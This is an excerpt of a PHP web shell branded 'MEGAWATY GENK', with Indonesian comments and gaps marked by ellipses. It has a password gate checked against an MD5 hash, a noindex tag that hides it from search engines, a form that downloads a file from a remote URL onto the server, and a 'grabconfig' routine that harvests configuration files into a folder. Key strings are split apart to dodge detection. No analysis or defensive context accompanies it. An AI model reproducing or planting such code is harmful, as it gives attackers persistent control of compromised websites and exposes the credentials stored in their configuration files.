...
$password = 'f9fe86c6d831b4d86940801dc380da55'; // MD5 hash dari password asli
...
<html>
<head>
<?php echo "<title>MEGAWATY GENK</title>"; ?>
	<meta name="robots" content="noindex">
	<link rel="icon" href="https://s6.gifyu.com/images/bzp2s.png" type="image/x-icon">
</head>
...
<center>
<?php
echo '<font face="Bungee" size="5">MEGAWATY GENK</font></center>
...
function author() {
	echo "<center><br>SUSUDOSU - 2"."02"."5<br><a href='https://XNXX.COM/' target='_blank'>MEGAWATY GENK</a></center>";
	exit();
}
...
<input type="text" name="darilink" class="up" placeholder="https:/xnxx.com/upl'.'oad.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="fi'.'le.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
</form>';
	...
	if (isset($_GET['opsidua'])) {
		if ($_GET['opsidua'] == "gra"."bco"."nfig") {
			...
			if (isset($_POST['gaskeun'])) {
				$rend = rand().".txt";
				$lokdi = $_POST['domena'];
				esyeem($lokdi, "mega"."waty"."ym/".$rend);
